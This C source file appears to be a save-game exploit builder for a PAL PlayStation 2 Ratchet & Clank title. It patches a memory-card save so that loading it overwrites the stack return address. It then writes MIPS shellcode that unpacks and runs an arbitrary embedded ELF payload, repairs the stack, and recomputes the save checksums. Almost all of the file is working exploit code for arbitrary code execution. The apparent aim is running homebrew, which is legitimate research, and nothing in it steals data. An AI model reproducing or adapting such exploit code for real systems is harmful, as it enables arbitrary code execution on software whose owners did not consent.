#include <racdoor/buffer.h>
#include <racdoor/elf.h>
#include <racdoor/mips.h>
#include <racdoor/util.h>

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// **** Build list ****

typedef struct {
	uint32_t unpackbuff;
	uint32_t g_HeroGadgetBox;
	uint32_t HelpDataMessages;
	uint32_t HelpDataGadgets;
	uint32_t HelpDataMisc;
	uint32_t HelpLog;
	uint32_t HelpLogPos;
	uint32_t GetGadgetEvent_jal_FastMemCpy;
} Addresses;

typedef struct {
	const char* id;
	const char* serial;
	Addresses addresses;
} Build;

Build builds[] = {
	{
		.id = "dl-pal-black",
		.serial = "sces-50916",
		{
			.unpackbuff                         = 0x00157738,
			.g_HeroGadgetBox                    = 0x001d4010,
			.HelpDataMessages                   = 0x001f1480,
			.HelpDataGadgets                    = 0x001f7660,
			.HelpDataMisc                       = 0x001f7750,
			.HelpLog                            = 0x001f7810,
			.HelpLogPos                         = 0x0021defc,
			.GetGadgetEvent_jal_FastMemCpy      = 0x006c48c8
		}
	}
};
int32_t build_count = sizeof(builds) / sizeof(Build);

// **** Save format ****

enum SaveBlockType {
	BLOCK_HelpDataMessages = 16,
	BLOCK_HelpDataMisc = 17,
	BLOCK_HelpDataGadgets = 18,
	BLOCK_HelpLog = 1010,
	BLOCK_HelpLogPos = 1011,
	BLOCK_g_HeroGadgetBox = 7008
};

#pragma pack(push, 1)

typedef struct {
	int32_t game_size;
	int32_t level_size;
} SaveFileHeader;

typedef struct {
	int32_t type;
	int32_t size;
	char data[];
} SaveBlock;

typedef struct {
	int32_t size;
	int32_t value;
	char data[];
} SaveChecksum;

#pragma pack(pop)

// **** Executable file formats ****

typedef struct {
	uint32_t address;
	uint32_t size;
	uint32_t section_type;
	uint32_t entry_point;
} RatchetSectionHeader;

uint32_t convert_elf(char* output, int32_t output_size, Buffer elf);

// **** Save parser ****

#define MAX_BLOCKS 32
#define MAX_LEVELS 32

typedef struct {
	SaveChecksum* checksum;
	SaveBlock* blocks[MAX_BLOCKS];
	int32_t block_count;
} SaveSlotBlockList;

typedef struct {
	SaveFileHeader* header;
	SaveSlotBlockList game;
	SaveSlotBlockList levels[MAX_LEVELS];
	int32_t level_count;
} SaveSlot;

SaveSlot parse_save(Buffer file);
SaveSlotBlockList parse_blocks(Buffer file);
void update_checksums(SaveSlot* save);
int32_t compute_checksum(const char* ptr, int32_t size);
SaveBlock* lookup_block(SaveSlotBlockList* list, int32_t type);

// **** Save game mutator ****

void mutate_save_game(SaveSlot* save, Buffer elf, Addresses* addresses);

int main(int argc, char** argv)
{
	CHECK(argc == 4, "usage: %s <input saveN.bin> <input rdx> <output saveN.bin>\n",
		argc > 0 ? argv[0] : "racdoor");
	
	const char* input_save_path = argv[1];
	const char* input_rdx_path = argv[2];
	const char* output_save_path = argv[3];
	
	Buffer file = read_file(input_save_path);
	SaveSlot save = parse_save(file);
	
	Buffer elf = read_file(input_rdx_path);
	
	Addresses addresses = builds[0].addresses;
	mutate_save_game(&save, elf, &addresses);
	
	update_checksums(&save);
	write_file(output_save_path, file);
}

// (maxlevel+1)*sizeof(StackFixup) == 75*56 == 4200 == sizeof(HelpLog)
typedef struct {
	uint8_t offset[11];
	uint8_t terminator;
	uint32_t data[11];
} StackFixup;

void mutate_save_game(SaveSlot* save, Buffer elf, Addresses* addresses)
{
	SaveBlock* help_data_messages = lookup_block(&save->game, BLOCK_HelpDataMessages);
	SaveBlock* help_data_gadgets = lookup_block(&save->game, BLOCK_HelpDataGadgets);
	SaveBlock* help_log = lookup_block(&save->game, BLOCK_HelpLog);
	SaveBlock* help_log_pos = lookup_block(&save->game, BLOCK_HelpLogPos);
	SaveBlock* gadget_box = lookup_block(&save->game, BLOCK_g_HeroGadgetBox);
	
	// Convert the payload data into the format the game expects, and put it in
	// the largest block that will be loaded into memory.
	uint32_t payload_entry = convert_elf(help_data_messages->data, help_data_messages->size, elf);
	
	// Corrupt the GetGadgetEvent function so it writes data from the memory
	// card over the stack.
	CHECK(help_log_pos->size == 4, "Invalid HelpLogPos block.\n");
	uint32_t offset = addresses->GetGadgetEvent_jal_FastMemCpy + 6 - addresses->HelpLog;
	*(uint32_t*) help_log_pos->data = (offset >> 1) | 0x80000000;
	
	uint32_t memcpy_dest_addr = 0x01fffa60;
	uint32_t memcpy_src_addr = 0x001d4090;
	uint32_t gadget_box_addr = addresses->g_HeroGadgetBox;
	uint32_t ofs_in_gadget_box_for_memcpy = memcpy_src_addr - gadget_box_addr;
	uint32_t stack_buffer_ra_ofs = 0x78;
	uint32_t ofs_in_gadget_box_for_ra = ofs_in_gadget_box_for_memcpy + stack_buffer_ra_ofs;
	
	// Overwrite the return address with the address of the HelpDataMisc global.
	CHECK((gadget_box->size % 4) == 0, "Invalid g_HeroGadgetBox block.\n");
	
	// Clear all the gadget events, including the head pointer. This is to make
	// the data that gets written onto the stack more predictable.
	*(uint32_t*) &gadget_box->data[0x2c] = 0;
	for(int32_t offset = 0; offset < 0x0a00; offset += 4)
		*(uint32_t*) &gadget_box->data[ofs_in_gadget_box_for_memcpy + offset] = offset;
	
	// Set the gadget type field of all the gadget events to 0xff to mark them
	// as free. If we don't do this Ratchet won't be able to shoot.
	for(int32_t offset = 0x30; offset < 0x0a30; offset += 0x50)
		gadget_box->data[offset + 0x2] = 0xff;
	
	*(uint32_t*) &gadget_box->data[ofs_in_gadget_box_for_ra] = addresses->HelpDataGadgets;
	
	//uint32_t ra_address_on_stack = 0x1fffb10;
	//uint32_t ra_address_2 = 0x67d410;
	//uint32_t write_ofs = ofs_in_gadget_box_for_memcpy + (ra_address_on_stack - memcpy_dest_addr);
	//*(uint32_t*) &gadget_box->data[write_ofs] = ra_address_2;
	
	StackFixup fixup;
	memset(&fixup, 0xff, sizeof(fixup));
	fixup.offset[0] = 0xb0;
	fixup.data[0] = 0x67d410;
	fixup.offset[1] = 0xb8;
	fixup.data[1] = 0x67d264;
	fixup.offset[2] = 0xcc;
	fixup.data[2] = 0x6abff8;
	fixup.offset[3] = 0x80;
	fixup.data[3] = 0x368f60;
	fixup.offset[4] = 0x88;
	fixup.data[4] = 0x368f60;
	fixup.offset[5] = 0x48;
	fixup.data[5] = 0x368f60;
	fixup.offset[5] = 0x58;
	fixup.data[5] = 0x368f60;
	for(int32_t level = 0; level < 2; level++)
		memcpy(help_log->data + level * sizeof(StackFixup), &fixup, sizeof(fixup));
	
	uint32_t* shellcode = (uint32_t*) help_data_gadgets->data;
	
	// Unpack the payload and jump to it.
	*shellcode++ = MIPS_LUI(MIPS_A0, addresses->HelpDataMessages >> 16);
	*shellcode++ = MIPS_ORI(MIPS_A0, MIPS_A0, addresses->HelpDataMessages);
	*shellcode++ = MIPS_LUI(MIPS_A1, 0xffff);
	*shellcode++ = MIPS_ORI(MIPS_A1, MIPS_A1, 0xffff);
	*shellcode++ = MIPS_JAL(addresses->unpackbuff);
	*shellcode++ = MIPS_NOP(); // Delay slot.
	// flush cache here
	*shellcode++ = MIPS_JAL(payload_entry);
	*shellcode++ = MIPS_NOP(); // Delay slot.
	
	// Clean up the stack.
	uint32_t expected_sp = 0x01fffae0;
	*shellcode++ = MIPS_ADDIU(MIPS_A0, MIPS_SP, memcpy_dest_addr - expected_sp);
	*shellcode++ = MIPS_LUI(MIPS_A1, addresses->HelpLog >> 16);
	*shellcode++ = MIPS_ORI(MIPS_A1, MIPS_A1, addresses->HelpLog);
	*shellcode++ = MIPS_ADDIU(MIPS_A2, MIPS_A1, 12);
	*shellcode++ = MIPS_ADDIU(MIPS_T0, MIPS_ZERO, 0xff);
	// loop begin
	*shellcode++ = MIPS_LBU(MIPS_T1, 0, MIPS_A1);
	*shellcode++ = MIPS_BEQ(MIPS_T1, MIPS_T0, 8);
	*shellcode++ = MIPS_NOP(); // Delay slot.
	*shellcode++ = MIPS_LW(MIPS_T2, 0, MIPS_A2);
	
	*shellcode++ = MIPS_ADD(MIPS_T3, MIPS_A0, MIPS_T1);
	*shellcode++ = MIPS_SW(MIPS_T2, 0, MIPS_T3);
	
	*shellcode++ = MIPS_ADDIU(MIPS_A1, MIPS_A1, 1);
	*shellcode++ = MIPS_ADDIU(MIPS_A2, MIPS_A2, 4);
	
	*shellcode++ = MIPS_BEQ(MIPS_ZERO, MIPS_ZERO, -9);
	*shellcode++ = MIPS_NOP(); // Delay slot.
	// loop end
	
	// Clean up HelpLogPos so we never call into this shellcode again.
	*shellcode++ = MIPS_LUI(MIPS_T0, addresses->HelpLogPos >> 16);
	*shellcode++ = MIPS_ORI(MIPS_T0, MIPS_T0, addresses->HelpLogPos);
	*shellcode++ = MIPS_SW(MIPS_ZERO, 0, MIPS_T0);
	
	// Clean up the corrupted instructions in GadgetBox::GetGadgetEvent.
	*shellcode++ = MIPS_LUI(MIPS_A0, (addresses->GetGadgetEvent_jal_FastMemCpy + 4) >> 16);
	*shellcode++ = MIPS_ORI(MIPS_A0, MIPS_A0, addresses->GetGadgetEvent_jal_FastMemCpy + 4);
	*shellcode++ = MIPS_LUI(MIPS_T0, 0x2406);
	*shellcode++ = MIPS_ORI(MIPS_T0, MIPS_T0, 0x0050);
	*shellcode++ = MIPS_SW(MIPS_T0, 0, MIPS_A0);
	*shellcode++ = MIPS_ADDIU(MIPS_A0, MIPS_A0, 4);
	*shellcode++ = MIPS_LUI(MIPS_T0, 0xa2b4);
	*shellcode++ = MIPS_ORI(MIPS_T0, MIPS_T0, 0x0002);
	*shellcode++ = MIPS_SW(MIPS_T0, 0, MIPS_A0);
	
	// Jump back to the game.
	*shellcode++ = MIPS_J(0x0067cca0);
	*shellcode++ = MIPS_NOP(); // Delay slot.
}

SaveSlot parse_save(Buffer file)
{
	int32_t offset = 0;
	
	SaveSlot save;
	
	save.header = buffer_get(file, offset, sizeof(SaveFileHeader), "file header");
	offset += sizeof(SaveFileHeader);
	
	save.game = parse_blocks(sub_buffer(file, offset, save.header->game_size, "game section"));
	offset += save.header->game_size;
	
	int32_t level = 0;
	while(offset + 3 < file.size)
	{
		CHECK(level < MAX_LEVELS, "Too many levels.\n");
		
		save.levels[level] = parse_blocks(sub_buffer(file, offset, save.header->level_size, "level section"));
		offset += save.header->level_size;
		
		level++;
	}
	
	save.level_count = level;
	
	return save;
}

SaveSlotBlockList parse_blocks(Buffer file)
{
	int32_t offset = 0;
	
	SaveSlotBlockList list;
	
	list.checksum = buffer_get(file, offset, sizeof(SaveChecksum), "checksum header");
	offset += sizeof(SaveChecksum);
	
	Buffer checksum_buffer = sub_buffer(file, offset, list.checksum->size, "checksum data");
	int32_t checksum_value = compute_checksum(checksum_buffer.data, checksum_buffer.size);
	CHECK(checksum_value == list.checksum->value, "Bad checksum.\n");

	int32_t block = 0;
	for(;;)
	{
		CHECK(block < MAX_BLOCKS, "Too many blocks.\n");
		
		list.blocks[block] = buffer_get(file, offset, sizeof(SaveBlock), "block header");
		offset += sizeof(SaveBlock);
		
		if(list.blocks[block]->type == -1)
			break;
		
		buffer_get(file, offset, list.blocks[block]->size, "block data");
		offset = align32(offset + list.blocks[block]->size, 4);
		
		block++;
	}
	
	list.block_count = block;
	
	return list;
}

void update_checksums(SaveSlot* save)
{
	save->game.checksum->value = compute_checksum(save->game.checksum->data, save->game.checksum->size);
	for(int32_t i = 0; i < save->level_count; i++)
		save->levels[i].checksum->value = compute_checksum(save->levels[i].checksum->data, save->levels[i].checksum->size);
}

int32_t compute_checksum(const char* ptr, int32_t size)
{
	uint32_t value = 0xedb88320;
	for(int32_t i = 0; i < size; i++)
	{
		value ^= (uint32_t) ptr[i] << 8;
		for(int32_t repeat = 0; repeat < 8; repeat++)
		{
			if((value & 0x8000) == 0)
				value <<= 1;
			else
				value = (value << 1) ^ 0x1f45;
		}
	}
	return (int32_t) (value & 0xffff);
}

SaveBlock* lookup_block(SaveSlotBlockList* list, int32_t type)
{
	SaveBlock* block = NULL;
	for(int32_t i = 0; i < list->block_count; i++)
		if(list->blocks[i]->type == type)
			block = list->blocks[i];
	
	CHECK(block, "No block of type %d found.\n", type);
	return block;
}

u32 convert_elf(char* output, s32 output_size, Buffer elf)
{
	s32 size_left = output_size;
	
	printf("%.2fkb total\n", output_size / 1024.f);
	
	ElfFileHeader* elf_header = buffer_get(elf, 0, sizeof(ElfFileHeader), "ELF file header");
	CHECK(elf_header->ident_magic == 0x464c457f, "ELF file has bad magic number.\n");
	CHECK(elf_header->ident_class == 1, "ELF file isn't 32 bit.\n");
	CHECK(elf_header->machine == 8, "ELF file isn't compiled for MIPS.\n");
	
	ElfSectionHeader* sections = buffer_get(elf, elf_header->shoff, elf_header->shnum * sizeof(ElfSectionHeader), "ELF section headers");
	for (u32 i = 0; i < elf_header->shnum; i++)
	{
		if (sections[i].addr == 0 || sections[i].size == 0)
			continue;
		
		s32 size = align32(sizeof(RatchetSectionHeader) + sections[i].size, 4);
		CHECK(size >= 0 && size_left >= size, "ELF too big!\n");
		
		RatchetSectionHeader* output_header = (RatchetSectionHeader*) output;
		output_header->address = sections[i].addr;
		output_header->size = sections[i].size;
		output_header->section_type = sections[i].type;
		output_header->entry_point = elf_header->entry;
		
		char* section_data = buffer_get(elf, sections[i].offset, sections[i].size, "ELF segment data");
		memcpy(output + sizeof(RatchetSectionHeader), section_data, sections[i].size);
		
		output += size;
		size_left -= size;
	}
	
	CHECK(size_left >= sizeof(RatchetSectionHeader), "ELF too big!\n");
	memset(output, 0, sizeof(RatchetSectionHeader));
	
	printf("%.2fkb used\n", (output_size - size_left) / 1024.f);
	printf("%.2fkb left\n", size_left / 1024.f);
	
	return elf_header->entry;
}
